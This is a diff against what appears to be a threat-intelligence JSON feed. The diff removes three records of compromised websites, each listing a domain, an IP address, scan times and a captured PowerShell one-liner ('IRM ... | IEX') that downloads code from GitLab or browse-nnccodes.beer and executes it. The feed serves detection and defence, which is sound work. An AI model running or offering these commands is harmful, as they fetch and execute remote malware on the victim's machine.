@@ -8103,57 +8103,5 @@
     ],
     "ReportId": "cmwassffh03bh0omlsfcxqfg0",
     "ScannedAt": "2026-11-10T14:41:01.832000+00:00"
-  },
-  {
-    "UrlDomain": "lifelinkhospital.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.222.226.74"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwasdmmu036x0omlnkf3eahk",
-    "ScannedAt": "2026-11-10T14:29:31.496000+00:00"
-  },
-  {
-    "UrlDomain": "adventurehut.in",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.53.101"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905342",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/e2fe5f14cc7170a4'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/e2fe5f14cc7170a4"
-    ],
-    "ReportId": "cmwas5id7031q0oml6ns2yux3",
-    "ScannedAt": "2026-11-10T14:23:12.726000+00:00"
-  },
-  {
-    "UrlDomain": "mummymayday.co.uk",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "109.228.61.211"
-    ],
-    "Related": [],
-    "Payload": "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd"
-    ],
-    "ReportId": "cmwarjoqg02qf0omloy4jf2gl",
-    "ScannedAt": "2026-11-10T14:06:14.491000+00:00"
   }
 ]
